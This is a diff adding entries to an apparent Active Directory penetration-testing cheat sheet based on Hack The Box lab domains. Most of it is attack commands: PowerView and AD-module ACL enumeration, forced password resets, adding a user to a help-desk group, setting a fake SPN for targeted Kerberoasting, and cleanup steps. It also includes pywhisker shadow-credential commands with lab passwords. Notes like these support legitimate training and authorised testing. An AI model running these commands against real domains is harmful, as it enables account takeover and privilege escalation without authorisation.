@@ -156,6 +156,7 @@ https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
 PS C:\> Import-Module .\PowerView.ps1
 PS C:\> Export-PowerViewCSV
 PS C:\> ConvertTo-SID
+PS C:\> Convert-NameToSid <username>
 PS C:\> Get-DomainPolicy
 PS C:\> Get-DomainSPNTicket
 PS C:\> Get-Domain
@@ -189,6 +190,14 @@ PS C:\> Get-DomainForeignGroupMember
 PS C:\> Get-DomainTrustMapping
 PS C:\> Get-DomainGroupMember -Identity "Domain Admins" -Recurse
 PS C:\> Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
+PS C:\> Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
+PS C:\> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
+PS C:\> Set-DomainUserPassword -Identity <username> -AccountPassword $damundsenPassword -Credential $Cred -Verbose
+PS C:\> Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members '<username>' -Credential $Cred2 -Verbose
+PS C:\> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
+PS C:\> Set-DomainObject -Credential $Cred2 -Identity <username> -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
+PS C:\> Set-DomainObject -Credential $Cred2 -Identity <username> -Clear serviceprincipalname -Verbose
+PS C:\> Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members '<username>' -Credential $Cred2 -Verbose
 ```
 
 - Active Directory Module
@@ -197,10 +206,15 @@ PS C:\> Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
 PS C:\> Import-Module ActiveDirectory
 PS C:\> Get-ADDomain
 PS C:\> Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
+PS C:\> Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
 PS C:\> Get-ADTrust -Filter *
 PS C:\> Get-ADGroup -Filter * | select name
+PS C:\> Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members
 PS C:\> Get-ADGroup -Identity "Backup Operators"
 PS C:\> Get-ADGroupMember -Identity "Backup Operators"
+PS C:\> $guid= "00299570-246d-11d0-a768-00aa006e0529" Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * | Select Name,DisplayName,DistinguishedName,rightsGuid | ?{$_.rightsGuid -eq $guid} | fl
+PS C:\> foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}
+PS C:\> ConvertFrom-SddlString
 ```
 
 - BloodHound
@@ -1297,6 +1311,18 @@ $ python3 gettgtpkinit.py -cert-pfx ../krbrelayx/DC01\$.pfx -dc-ip 10.129.234.10
 https://github.com/ShutdownRepo/pywhisker
 $ pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add
 $ python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
+```
+
+- Create a PSCredential Object
+
+```
+PS C:\> $SecPassword = ConvertTo-SecureString '<password>' -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
+```
+
+- Create a SecureString Object
+
+```
+PS C:\> $damundsenPassword = ConvertTo-SecureString '<password>' -AsPlainText -Force
 ```
 
 #5. - Privilege Escalation
